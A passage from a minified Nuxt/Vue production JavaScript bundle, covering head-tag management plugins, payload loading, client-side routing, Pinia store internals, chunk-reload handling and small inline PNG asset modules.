        n && (e._d = n);
      },
      "tags:resolve": function (e) {
        const t = {};
        e.tags.forEach((o) => {
          const i = (o.key ? `${o.tag}:${o.key}` : o._d) || o._p,
            a = t[i];
          if (a) {
            let f = null == o ? void 0 : o.tagDuplicateStrategy;
            if ((!f && Hy.includes(o.tag) && (f = "merge"), "merge" === f)) {
              const p = a.props;
              return (
                ["class", "style"].forEach((v) => {
                  p[v] &&
                    (o.props[v]
                      ? ("style" === v && !p[v].endsWith(";") && (p[v] += ";"),
                        (o.props[v] = `${p[v]} ${o.props[v]}`))
                      : (o.props[v] = p[v]));
                }),
                void (t[i].props = { ...p, ...o.props })
              );
            }
            if (o._e === a._e)
              return (
                (a._duped = a._duped || []),
                (o._d = `${a._d}:${a._duped.length + 1}`),
                void a._duped.push(o)
              );
            if (yr(o) > yr(a)) return;
          }
          const u =
            Object.keys(o.props).length +
            (o.innerHTML ? 1 : 0) +
            (o.textContent ? 1 : 0);
          $i.includes(o.tag) && 0 === u ? delete t[i] : (t[i] = o);
        });
        const n = [];
        Object.values(t).forEach((o) => {
          const i = o._duped;
          delete o._duped, n.push(o), i && n.push(...i);
        }),
          (e.tags = n),
          (e.tags = e.tags.filter(
            (o) =>
              !(
                "meta" === o.tag &&
                (o.props.name || o.props.property) &&
                !o.props.content
              )
          ));
      },
    },
  },
  Qy = {
    mode: "server",
    hooks: {
      "tags:resolve": function (e) {
        const t = {};
        e.tags
          .filter(
            (n) =>
              ["titleTemplate", "templateParams", "title"].includes(n.tag) &&
              "server" === n._m
          )
          .forEach((n) => {
            t[n.tag] = n.tag.startsWith("title") ? n.textContent : n.props;
          }),
          Object.keys(t).length &&
            e.tags.push({
              tag: "script",
              innerHTML: JSON.stringify(t),
              props: { id: "unhead:payload", type: "application/json" },
            });
      },
    },
  },
  Xy = ["script", "link", "bodyAttrs"],
  Zy = (e) => ({
    hooks: {
      "tags:resolve": function (t) {
        for (const n of t.tags.filter((o) => Xy.includes(o.tag)))
          Object.entries(n.props).forEach(([o, i]) => {
            o.startsWith("on") &&
              "function" == typeof i &&
              (e.ssr && Kc.includes(o)
                ? (n.props[o] = `this.dataset.${o}fired = true`)
                : delete n.props[o],
              (n._eventHandlers = n._eventHandlers || {}),
              (n._eventHandlers[o] = i));
          }),
            e.ssr &&
              n._eventHandlers &&
              (n.props.src || n.props.href) &&
              (n.key = n.key || $a(n.props.src || n.props.href));
      },
      "dom:renderTag": function ({ $el: t, tag: n }) {
        var o, i;
        for (const a of Object.keys(
          (null == t ? void 0 : t.dataset) || {}
        ).filter((u) => Kc.some((f) => `${f}fired` === u))) {
          const u = a.replace("fired", "");
          null == (i = null == (o = n._eventHandlers) ? void 0 : o[u]) ||
            i.call(t, new Event(u.replace("on", "")));
        }
      },
    },
  }),
  qy = ["link", "style", "script", "noscript"],
  Ky = {
    hooks: {
      "tag:normalise": ({ tag: e }) => {
        e.key && qy.includes(e.tag) && (e.props["data-hid"] = e._h = $a(e.key));
      },
    },
  },
  $y = {
    hooks: {
      "tags:resolve": (e) => {
        const t = (n) => {
          var o;
          return null == (o = e.tags.find((i) => i._d === n)) ? void 0 : o._p;
        };
        for (const { prefix: n, offset: o } of zy)
          for (const i of e.tags.filter(
            (a) =>
              "string" == typeof a.tagPriority && a.tagPriority.startsWith(n)
          )) {
            const a = t(i.tagPriority.replace(n, ""));
            typeof a < "u" && (i._p = a + o);
          }
        e.tags.sort((n, o) => n._p - o._p).sort((n, o) => yr(n) - yr(o));
      },
    },
  },
  ew = { meta: "content", link: "href", htmlAttrs: "lang" },
  tw = (e) => ({
    hooks: {
      "tags:resolve": (t) => {
        var f;
        const { tags: n } = t,
          o =
            null == (f = n.find((p) => "title" === p.tag))
              ? void 0
              : f.textContent,
          i = n.findIndex((p) => "templateParams" === p.tag),
          a = -1 !== i ? n[i].props : {},
          u = a.separator || "|";
        delete a.separator, (a.pageTitle = er(a.pageTitle || o || "", a, u));
        for (const p of n.filter((v) => !1 !== v.processTemplateParams)) {
          const v = ew[p.tag];
          v && "string" == typeof p.props[v]
            ? (p.props[v] = er(p.props[v], a, u))
            : (!0 === p.processTemplateParams ||
                ["titleTemplate", "title"].includes(p.tag)) &&
              ["innerHTML", "textContent"].forEach((y) => {
                "string" == typeof p[y] && (p[y] = er(p[y], a, u));
              });
        }
        (e._templateParams = a),
          (e._separator = u),
          (t.tags = n.filter((p) => "templateParams" !== p.tag));
      },
    },
  }),
  nw = {
    hooks: {
      "tags:resolve": (e) => {
        const { tags: t } = e;
        let n = t.findIndex((i) => "titleTemplate" === i.tag);
        const o = t.findIndex((i) => "title" === i.tag);
        if (-1 !== o && -1 !== n) {
          const i = Xc(t[n].textContent, t[o].textContent);
          null !== i ? (t[o].textContent = i || t[o].textContent) : delete t[o];
        } else if (-1 !== n) {
          const i = Xc(t[n].textContent);
          null !== i &&
            ((t[n].textContent = i), (t[n].tag = "title"), (n = -1));
        }
        -1 !== n && delete t[n], (e.tags = t.filter(Boolean));
      },
    },
  },
  ow = {
    hooks: {
      "tags:afterResolve": function (e) {
        for (const t of e.tags)
          "string" == typeof t.innerHTML &&
            (t.innerHTML &&
            ["application/ld+json", "application/json"].includes(t.props.type)
              ? (t.innerHTML = t.innerHTML.replace(/</g, "\\u003C"))
              : (t.innerHTML = t.innerHTML.replace(
                  new RegExp(`</${t.tag}`, "g"),
                  `<\\/${t.tag}`
                )));
      },
    },
  };
let Vd;
function iw(e = {}) {
  const t = rw(e);
  return t.use(Uy()), (Vd = t);
}
function $c(e, t) {
  return !e || ("server" === e && t) || ("client" === e && !t);
}
function rw(e = {}) {
  const t = Rd();
  t.addHooks(e.hooks || {}),
    (e.document = e.document || (Ly ? document : void 0));
  const n = !e.document,
    o = () => {
      (f.dirty = !0), t.callHook("entries:updated", f);
    };
  let i = 0,
    a = [];
  const u = [],
    f = {
      plugins: u,
      dirty: !1,
      resolvedOptions: e,
      hooks: t,
      headEntries: () => a,
      use(p) {
        const v = "function" == typeof p ? p(f) : p;
        (!v.key || !u.some((y) => y.key === v.key)) &&
          (u.push(v), $c(v.mode, n) && t.addHooks(v.hooks || {}));
      },
      push(p, v) {
        null == v || delete v.head;
        const y = { _i: i++, input: p, ...v };
        return (
          $c(y.mode, n) && (a.push(y), o()),
          {
            dispose() {
              (a = a.filter((w) => w._i !== y._i)),
                t.callHook("entries:updated", f),
                o();
            },
            patch(w) {
              (a = a.map((x) => (x._i === y._i && (x.input = y.input = w), x))),
                o();
            },
          }
        );
      },
      async resolveTags() {
        const p = { tags: [], entries: [...a] };
        await t.callHook("entries:resolve", p);
        for (const v of p.entries) {
          const y = v.resolvedInput || v.input;
          if (
            ((v.resolvedInput = await (v.transform ? v.transform(y) : y)),
            v.resolvedInput)
          )
            for (const w of await Jy(v)) {
              const x = {
                tag: w,
                entry: v,
                resolvedOptions: f.resolvedOptions,
              };
              await t.callHook("tag:normalise", x), p.tags.push(x.tag);
            }
        }
        return (
          await t.callHook("tags:beforeResolve", p),
          await t.callHook("tags:resolve", p),
          await t.callHook("tags:afterResolve", p),
          p.tags
        );
      },
      ssr: n,
    };
  return (
    [
      Vy,
      Qy,
      Zy,
      Ky,
      $y,
      tw,
      nw,
      ow,
      ...((null == e ? void 0 : e.plugins) || []),
    ].forEach((p) => f.use(p)),
    f.hooks.callHook("init", f),
    f
  );
}
function sw() {
  return Vd;
}
const aw = wd.startsWith("3");
function lw(e) {
  return "function" == typeof e ? e() : De(e);
}
function fa(e, t = "") {
  if (e instanceof Promise) return e;
  const n = lw(e);
  return e && n
    ? Array.isArray(n)
      ? n.map((o) => fa(o, t))
      : "object" == typeof n
      ? Object.fromEntries(
          Object.entries(n).map(([o, i]) =>
            "titleTemplate" === o || o.startsWith("on")
              ? [o, De(i)]
              : [o, fa(i, o)]
          )
        )
      : n
    : n;
}
const cw = {
    hooks: {
      "entries:resolve": function (e) {
        for (const t of e.entries) t.resolvedInput = fa(t.input);
      },
    },
  },
  Qd = "usehead";
function uw(e) {
  return {
    install(n) {
      aw &&
        ((n.config.globalProperties.$unhead = e),
        (n.config.globalProperties.$head = e),
        n.provide(Qd, e));
    },
  }.install;
}
function dw(e = {}) {
  e.domDelayFn = e.domDelayFn || ((n) => Dr(() => setTimeout(() => n(), 0)));
  const t = iw(e);
  return t.use(cw), (t.install = uw(t)), t;
}
const ha =
    typeof globalThis < "u"
      ? globalThis
      : typeof window < "u"
      ? window
      : typeof global < "u"
      ? global
      : typeof self < "u"
      ? self
      : {},
  pa = "__unhead_injection_handler__";
function fw(e) {
  ha[pa] = e;
}
function QM() {
  if (pa in ha) return ha[pa]();
  return oo(Qd) || sw();
}
const hw = { nuxt: { buildId: "2263ad5c-63f6-440a-abbb-63bf9061a7d6" } },
  pw = dy(hw);
function Xd() {
  const e = it();
  return e._appConfig || (e._appConfig = fn(pw)), e._appConfig;
}
const XM = { componentName: "NuxtLink" },
  gw = "#__nuxt";
let tr, Zd;
function mw() {
  var t;
  const e = null == (t = Xd().nuxt) ? void 0 : t.buildId;
  return (
    (tr = $fetch(Za(`builds/meta/${e}.json`))),
    tr.then((n) => {
      Zd = cy(n.matcher);
    }),
    tr
  );
}
function Lr() {
  return tr || mw();
}
async function el(e) {
  return await Lr(), uy({}, ...Zd.matchAll(e).reverse());
}
function eu(e, t = {}) {
  const n = yw(e, t),
    o = it(),
    i = (o._payloadCache = o._payloadCache || {});
  return (
    n in i ||
      (i[n] = ww(e).then((a) =>
        a ? qd(n).then((u) => u || (delete i[n], null)) : ((i[n] = null), null)
      )),
    i[n]
  );
}
const vw = "_payload.json";
function yw(e, t = {}) {
  var i;
  const n = new URL(e, "http://localhost");
  if ("localhost" !== n.host || Fo(n.pathname, { acceptRelative: !0 }))
    throw new Error("Payload URL must not include hostname: " + e);
  const o =
    t.hash ||
    (t.fresh ? Date.now() : null == (i = Xd().nuxt) ? void 0 : i.buildId);
  return Fr(vr().app.baseURL, n.pathname, vw + (o ? `?${o}` : ""));
}
async function qd(e) {
  const t = fetch(e).then((n) => n.text().then(Kd));
  try {
    return await t;
  } catch (n) {
    console.warn("[nuxt] Cannot load payload ", e, n);
  }
  return null;
}
async function ww(e = Bd().path) {
  if (((e = Qa(e)), (await Lr()).prerendered.includes(e))) return !0;
  const n = await el(e);
  return !!n.prerender && !n.redirect;
}
let Ui = null;
async function Aw() {
  if (Ui) return Ui;
  const e = document.getElementById("__NUXT_DATA__");
  if (!e) return {};
  const t = await Kd(e.textContent || ""),
    n = e.dataset.src ? await qd(e.dataset.src) : void 0;
  return (Ui = { ...t, ...n, ...window.__NUXT__ }), Ui;
}
async function Kd(e) {
  return await Oy(e, it()._payloadRevivers);
}
function bw(e, t) {
  it()._payloadRevivers[e] = t;
}
const tu = {
    NuxtError: (e) => Ka(e),
    EmptyShallowRef: (e) =>
      fc("_" === e ? void 0 : "0n" === e ? BigInt(0) : hr(e)),
    EmptyRef: (e) => Me("_" === e ? void 0 : "0n" === e ? BigInt(0) : hr(e)),
    ShallowRef: (e) => fc(e),
    ShallowReactive: (e) => Ru(e),
    Ref: (e) => Me(e),
    Reactive: (e) => fn(e),
  },
  _w = zn({
    name: "nuxt:revive-payload:client",
    order: -30,
    async setup(e) {
      let t, n;
      for (const o in tu) bw(o, tu[o]);
      Object.assign(
        e.payload,
        (([t, n] = Cd(() => e.runWithContext(Aw))), (t = await t), n(), t)
      ),
        (window.__NUXT__ = e.payload);
    },
  }),
  xw = [],
  Pw = zn({
    name: "nuxt:head",
    enforce: "pre",
    setup(e) {
      const t = dw({ plugins: xw });
      fw(() => it().vueApp._context.provides.usehead), e.vueApp.use(t);
      {
        let n = !0;
        const o = async () => {
          (n = !1), await Hd(t);
        };
        t.hooks.hook("dom:beforeRender", (i) => {
          i.shouldRender = !n;
        }),
          e.hooks.hook("page:start", () => {
            n = !0;
          }),
          e.hooks.hook("page:finish", () => {
            e.isHydrating || o();
          }),
          e.hooks.hook("app:error", o),
          e.hooks.hook("app:suspense:resolve", o);
      }
    },
  }),
  Mw = async (e) => {
    let t, n;
    const o = (([t, n] = Cd(() => el(e.path))), (t = await t), n(), t);
    if (o.redirect)
      return Fo(o.redirect, { acceptRelative: !0 })
        ? ((window.location.href = o.redirect), !1)
        : o.redirect;
  },
  Sw = [Mw];
function js(e) {
  "object" == typeof e &&
    (e = Ed({
      pathname: e.path || "",
      search: Pd(e.query || {}),
      hash: e.hash || "",
    }));
  const t = wi(e.toString());
  return {
    path: t.pathname,
    fullPath: e,
    query: xd(t.search),
    hash: t.hash,
    params: {},
    name: void 0,
    matched: [],
    redirectedFrom: void 0,
    meta: {},
    href: e,
  };
}
const Tw = zn({
    name: "nuxt:router",
    enforce: "pre",
    setup(e) {
      const t =
          Sv(window.location.pathname, vr().app.baseURL) +
          window.location.search +
          window.location.hash,
        n = [],
        o = {
          "navigate:before": [],
          "resolve:before": [],
          "navigate:after": [],
          error: [],
        },
        i = (w, x) => (o[w].push(x), () => o[w].splice(o[w].indexOf(x), 1)),
        a = vr().app.baseURL,
        u = fn(js(t));
      async function f(w, x) {
        try {
          const k = js(w);
          for (const D of o["navigate:before"]) {
            const G = await D(k, u);
            if (!1 === G || G instanceof Error) return;
            if ("string" == typeof G && G.length) return f(G, !0);
          }
          for (const D of o["resolve:before"]) await D(k, u);
          Object.assign(u, k),
            window.history[x ? "replaceState" : "pushState"](
              {},
              "",
              Fr(a, k.fullPath)
            ),
            e.isHydrating || (await e.runWithContext(by));
          for (const D of o["navigate:after"]) await D(k, u);
        } catch (k) {
          for (const D of o.error) await D(k);
        }
      }
      const v = {
        currentRoute: co(() => u),
        isReady: () => Promise.resolve(),
        options: {},
        install: () => Promise.resolve(),
        push: (w) => f(w, !1),
        replace: (w) => f(w, !0),
        back: () => window.history.go(-1),
        go: (w) => window.history.go(w),
        forward: () => window.history.go(1),
        beforeResolve: (w) => i("resolve:before", w),
        beforeEach: (w) => i("navigate:before", w),
        afterEach: (w) => i("navigate:after", w),
        onError: (w) => i("error", w),
        resolve: js,
        addRoute: (w, x) => {
          n.push(x);
        },
        getRoutes: () => n,
        hasRoute: (w) => n.some((x) => x.name === w),
        removeRoute: (w) => {
          const x = n.findIndex((k) => k.name === w);
          -1 !== x && n.splice(x, 1);
        },
      };
      e.vueApp.component(
        "RouterLink",
        Xu({
          functional: !0,
          props: {
            to: { type: String, required: !0 },
            custom: Boolean,
            replace: Boolean,
            activeClass: String,
            exactActiveClass: String,
            ariaCurrentValue: String,
          },
          setup: (w, { slots: x }) => {
            const k = () => f(w.to, w.replace);
            return () => {
              var G;
              const D = v.resolve(w.to);
              return w.custom
                ? null == (G = x.default)
                  ? void 0
                  : G.call(x, { href: w.to, navigate: k, route: D })
                : Pm(
                    "a",
                    { href: w.to, onClick: (q) => (q.preventDefault(), k()) },
                    x
                  );
            };
          },
        })
      ),
        window.addEventListener("popstate", (w) => {
          const x = w.target.location;
          v.replace(x.href.replace(x.origin, ""));
        }),
        (e._route = u),
        (e._middleware = e._middleware || { global: [], named: {} });
      const y = e.payload.state._layout;
      return (
        e.hooks.hookOnce("app:created", async () => {
          v.beforeEach(async (w, x) => {
            (w.meta = fn(w.meta || {})),
              e.isHydrating && y && !ro(w.meta.layout) && (w.meta.layout = y),
              (e._processingMiddleware = !0);
            {
              const k = new Set([...Sw, ...e._middleware.global]);
              {
                const D = await e.runWithContext(() => el(w.path));
                if (D.appMiddleware)
                  for (const G in D.appMiddleware) {
                    const q = e._middleware.named[G];
                    if (!q) return;
                    D.appMiddleware[G] ? k.add(q) : k.delete(q);
                  }
              }
              for (const D of k) {
                const G = await e.runWithContext(() => D(w, x));
                if (!0 !== G && (G || !1 === G)) return G;
              }
            }
          }),
            v.afterEach(() => {
              delete e._processingMiddleware;
            }),
            await v.replace(t),
            kv(u.fullPath, t) || (await e.runWithContext(() => wy(u.fullPath)));
        }),
        { provide: { route: u, router: v } }
      );
    },
  }),
  nu =
    globalThis.requestIdleCallback ||
    ((e) => {
      const t = Date.now(),
        n = {
          didTimeout: !1,
          timeRemaining: () => Math.max(0, 50 - (Date.now() - t)),
        };
      return setTimeout(() => {
        e(n);
      }, 1);
    }),
  ZM =
    globalThis.cancelIdleCallback ||
    ((e) => {
      clearTimeout(e);
    }),
  $d = (e) => {
    const t = it();
    t.isHydrating
      ? t.hooks.hookOnce("app:suspense:resolve", () => {
          nu(e);
        })
      : nu(e);
  },
  kw = zn({
    name: "nuxt:payload",
    setup(e) {
      Ai().beforeResolve(async (t, n) => {
        if (t.path === n.path) return;
        const o = await eu(t.path);
        o && Object.assign(e.static.data, o.data);
      }),
        $d(() => {
          var t;
          e.hooks.hook("link:prefetch", async (n) => {
            wi(n).protocol || (await eu(n));
          }),
            "slow-2g" !==
              (null == (t = navigator.connection) ? void 0 : t.effectiveType) &&
              setTimeout(Lr, 1e3);
        });
    },
  }),
  Ew = zn((e) => {
    let t;
    async function n() {
      const o = await Lr();
      t && clearTimeout(t), (t = setTimeout(n, 36e5));
      try {
        const i = await $fetch(Za("builds/latest.json") + `?${Date.now()}`);
        i.id !== o.id && e.hooks.callHook("app:manifest:update", i);
      } catch {}
    }
    $d(() => {
      t = setTimeout(n, 36e5);
    });
  }),
  Dw = !1;
let ef;
const bi = (e) => (ef = e),
  tf = Symbol();
function ga(e) {
  return (
    e &&
    "object" == typeof e &&
    "[object Object]" === Object.prototype.toString.call(e) &&
    "function" != typeof e.toJSON
  );
}
var oi;
function Iw() {
  const e = ka(!0),
    t = e.run(() => Me({}));
  let n = [],
    o = [];
  const i = Er({
    install(a) {
      bi(i),
        (i._a = a),
        a.provide(tf, i),
        (a.config.globalProperties.$pinia = i),
        o.forEach((u) => n.push(u)),
        (o = []);
    },
    use(a) {
      return this._a ? n.push(a) : o.push(a), this;
    },
    _p: n,
    _a: null,
    _e: e,
    _s: new Map(),
    state: t,
  });
  return i;
}
!(function (e) {
  (e.direct = "direct"),
    (e.patchObject = "patch object"),
    (e.patchFunction = "patch function");
})(oi || (oi = {}));
const nf = () => {};
function ou(e, t, n, o = nf) {
  e.push(t);
  const i = () => {
    const a = e.indexOf(t);
    a > -1 && (e.splice(a, 1), o());
  };
  return !n && bu() && Jp(i), i;
}
function mo(e, ...t) {
  e.slice().forEach((n) => {
    n(...t);
  });
}
const Ow = (e) => e();
function ma(e, t) {
  e instanceof Map && t instanceof Map && t.forEach((n, o) => e.set(o, n)),
    e instanceof Set && t instanceof Set && t.forEach(e.add, e);
  for (const n in t) {
    if (!t.hasOwnProperty(n)) continue;
    const o = t[n],
      i = e[n];
    ga(i) && ga(o) && e.hasOwnProperty(n) && !$e(o) && !Fn(o)
      ? (e[n] = ma(i, o))
      : (e[n] = o);
  }
  return e;
}
const Rw = Symbol();
function Cw(e) {
  return !ga(e) || !e.hasOwnProperty(Rw);
}
const { assign: En } = Object;
function Ww(e) {
  return !(!$e(e) || !e.effect);
}
function Gw(e, t, n, o) {
  const { state: i, actions: a, getters: u } = t,
    f = n.state.value[e];
  let p;
  return (
    (p = of(
      e,
      function v() {
        f || (n.state.value[e] = i ? i() : {});
        const y = fg(n.state.value[e]);
        return En(
          y,
          a,
          Object.keys(u || {}).reduce(
            (w, x) => (
              (w[x] = Er(
                co(() => {
                  bi(n);
                  const k = n._s.get(e);
                  return u[x].call(k, k);
                })
              )),
              w
            ),
            {}
          )
        );
      },
      t,
      n,
      o,
      !0
    )),
    p
  );
}
function of(e, t, n = {}, o, i, a) {
  let u;
  const f = En({ actions: {} }, n),
    p = { deep: !0 };
  let v,
    y,
    k,
    w = [],
    x = [];
  const D = o.state.value[e];
  let G;
  function q(U) {
    let B;
    (v = y = !1),
      "function" == typeof U
        ? (U(o.state.value[e]),
          (B = { type: oi.patchFunction, storeId: e, events: k }))
        : (ma(o.state.value[e], U),
          (B = { type: oi.patchObject, payload: U, storeId: e, events: k }));
    const $ = (G = Symbol());
    Dr().then(() => {
      G === $ && (v = !0);
    }),
      (y = !0),
      mo(w, B, o.state.value[e]);
  }
  !a && !D && (o.state.value[e] = {}), Me({});
  const ie = a
    ? function () {
        const { state: B } = n,
          $ = B ? B() : {};
        this.$patch((Pe) => {
          En(Pe, $);
        });
      }
    : nf;
  function E(U, B) {
    return function () {
      bi(o);
      const $ = Array.from(arguments),
        Pe = [],
        pe = [];
      let Se;
      mo(x, {
        args: $,
        name: U,
        store: I,
        after: function Ce(Z) {
          Pe.push(Z);
        },
        onError: function Oe(Z) {
          pe.push(Z);
        },
      });
      try {
        Se = B.apply(this && this.$id === e ? this : I, $);
      } catch (Z) {
        throw (mo(pe, Z), Z);
      }
      return Se instanceof Promise
        ? Se.then((Z) => (mo(Pe, Z), Z)).catch(
            (Z) => (mo(pe, Z), Promise.reject(Z))
          )
        : (mo(Pe, Se), Se);
    };
  }
  const I = fn({
    _p: o,
    $id: e,
    $onAction: ou.bind(null, x),
    $patch: q,
    $reset: ie,
    $subscribe(U, B = {}) {
      const $ = ou(w, U, B.detached, () => Pe()),
        Pe = u.run(() =>
          Zi(
            () => o.state.value[e],
            (pe) => {
              ("sync" === B.flush ? y : v) &&
                U({ storeId: e, type: oi.direct, events: k }, pe);
            },
            En({}, p, B)
          )
        );
      return $;
    },
    $dispose: function te() {
      u.stop(), (w = []), (x = []), o._s.delete(e);
    },
  });
  o._s.set(e, I);
  const M = ((o._a && o._a.runWithContext) || Ow)(() =>
    o._e.run(() => (u = ka()).run(t))
  );
  for (const U in M) {
    const B = M[U];
    if (($e(B) && !Ww(B)) || Fn(B))
      a ||
        (D && Cw(B) && ($e(B) ? (B.value = D[U]) : ma(B, D[U])),
        (o.state.value[e][U] = B));
    else if ("function" == typeof B) {
      const $ = E(U, B);
      (M[U] = $), (f.actions[U] = B);
    }
  }
  return (
    En(I, M),
    En(Ge(I), M),
    Object.defineProperty(I, "$state", {
      get: () => o.state.value[e],
      set: (U) => {
        q((B) => {
          En(B, U);
        });
      },
    }),
    o._p.forEach((U) => {
      En(
        I,
        u.run(() => U({ store: I, app: o._a, pinia: o, options: f }))
      );
    }),
    D && a && n.hydrate && n.hydrate(I.$state, D),
    (v = !0),
    (y = !0),
    I
  );
}
function rf(e, t, n) {
  let o, i;
  const a = "function" == typeof t;
  function u(f, p) {
    const v = Ya();
    return (
      (f = f || (v ? oo(tf, null) : null)) && bi(f),
      (f = ef)._s.has(o) || (a ? of(o, t, i, f) : Gw(o, i, f)),
      f._s.get(o)
    );
  }
  return (
    "string" == typeof e ? ((o = e), (i = a ? n : t)) : ((i = e), (o = e.id)),
    (u.$id = o),
    u
  );
}
function Fw(e = {}) {
  const t = e.path || window.location.pathname;
  let n = {};
  try {
    n = hr(sessionStorage.getItem("nuxt:reload") || "{}");
  } catch {}
  if (
    e.force ||
    (null == n ? void 0 : n.path) !== t ||
    (null == n ? void 0 : n.expires) < Date.now()
  ) {
    try {
      sessionStorage.setItem(
        "nuxt:reload",
        JSON.stringify({ path: t, expires: Date.now() + (e.ttl ?? 1e4) })
      );
    } catch {}
    if (e.persistState)
      try {
        sessionStorage.setItem(
          "nuxt:reload:state",
          JSON.stringify({ state: it().payload.state })
        );
      } catch {}
    window.location.pathname !== t
      ? (window.location.href = t)
      : window.location.reload();
  }
}
const Lw = zn((e) => {
    const t = Iw();
    return (
      e.vueApp.use(t),
      bi(t),
      e.payload && e.payload.pinia && (t.state.value = e.payload.pinia),
      { provide: { pinia: t } }
    );
  }),
  jw = zn({ name: "nuxt:global-components" }),
  Nw = zn({
    name: "nuxt:chunk-reload",
    setup(e) {
      const t = Ai(),
        n = vr(),
        o = new Set();
      function i(a) {
        Fw({
          path:
            "href" in a && "#" === a.href[0]
              ? n.app.baseURL + a.href
              : Fr(n.app.baseURL, a.fullPath),
          persistState: !0,
        });
      }
      t.beforeEach(() => {
        o.clear();
      }),
        e.hook("app:chunkError", ({ error: a }) => {
          o.add(a);
        }),
        e.hook("app:manifest:update", () => {
          t.beforeResolve(i);
        }),
        t.onError((a, u) => {
          o.has(a) && i(u);
        });
    },
  }),
  Bw = [_w, Pw, Tw, kw, Ew, Lw, jw, Nw],
  Jw = "" + new URL("music.png", import.meta.url).href,
  jr = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: Jw },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  zw = "" + new URL("apple2.BH3vfWNr.png", import.meta.url).href,
  Nr = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: zw },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  Yw = "" + new URL("apple3.DLQ09TwX.png", import.meta.url).href,
  Br = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: Yw },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  Uw =
    "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwBAMAAAClLOS0AAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAIVBMVEUAAACAgIDAwMAAAAD///8AgIAA//8AAIAAAP8A/wAAgACZBxulAAAAAXRSTlMAQObYZgAAAAFiS0dEBI9o2VEAAAAHdElNRQfiBBMBJCt84jxJAAAA5UlEQVQ4y62TyxHCIBCGoYQFGghJASBagJEGMk6sxbsXW/Dq0SpNsuSxPEad8ePGNz9kNwtjExwobEZoApiwz+l+tQjlCTAL3kYnfSFqt6KI6FeouJTFGQ86JKLDi2PR9x3WkIjrfeSWCuxWnQrsyumPwpVEUnlZhNamotTE38VmpohotkMyCGfywyChzgsrZHZyJVQomKNYASggpkLBfQwEEd09zugn8XguL2NArOI1i2m4dx+PUjoVJhvQFgON9GS1lcXAcU+XBlcIQBzwIVD4pPD8VdpBbHmmCJP/FyHApIvBwBu9bp7SZvn+ewAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAxOC0wNC0xOVQwMTozNjo0My0wNDowMNV8Hl4AAAAldEVYdGRhdGU6bW9kaWZ5ADIwMTgtMDQtMTlUMDE6MzY6NDMtMDQ6MDCkIabiAAAAAElFTkSuQmCC",
  Jr = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: Uw },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  sf =
    "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAQAAADZc7J/AAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QA/4ePzL8AAAAHdElNRQfiBhgXBwzSK/XgAAAAjElEQVRIx+2VQQrAIAwE1+K/oz9rX5ZeiopaTazFHronETMOIRCDK44hiDP5jY1H6pZ7gJEhNsm/iQHAjwBUIJSAEmF15aEBoRcqAwKDwdiTu8LAdxB5bP9JOwoDkgFeNKjD5xvc2wh7oLVRGNSR8w2+PImr54BGAP8cyLLeQL1YGgbHECDuWtF6LytPTdMhXzC2L6sAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDYtMjRUMjM6MDc6MTItMDQ6MDDinXh7AAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTA2LTI0VDIzOjA3OjEyLTA0OjAwk8DAxwAAAABJRU5ErkJggg==",
  zr = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: sf },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  af =
    "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwBAMAAAClLOS0AAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAGFBMVEUAAACZmQAAAAD4+Pj//5nMzGb/zJn////5no2yAAAAAXRSTlMAQObYZgAAAAFiS0dEBxZhiOsAAAAHdElNRQfiBhgXARMJeV+TAAABE0lEQVQ4y82TzQ3CMAyFywhtxb1iA1QWQLJ858AGlvcfAfs5aRMTceapaoVfPv9FTNMPzdDyFb/s0H3LxkqhjFwexXhuYyAjB5CRE0jI9X3qNVfZkXUfautSFQkzL9nwIAlJNixExKSJELGgQJlge9jzJQPnzeoJL4uPDAiORB3B3pM34J52hADg1BVXE3ZbA785sCZVBULt5BwtAUuTCypEiSNVNCmM8UTTrsxTL66kzRyOYOGoXYuXRB40wLrVbkAUttdRg33dFL16Lj264siF9OThZkBcKqFVrYSfjWVo7MuIdkBcNoBzV1K2YQQ+Gqk8HPtGYXZIK1EuNJwyIGagGE2RSNHudR5qmW5jff2F/1wfr4rjk5A1shsAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDYtMjRUMjM6MDE6MTktMDQ6MDDthFzGAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTA2LTI0VDIzOjAxOjE5LTA0OjAwnNnkegAAAABJRU5ErkJggg==",
  Yr = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: af },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  Hw =
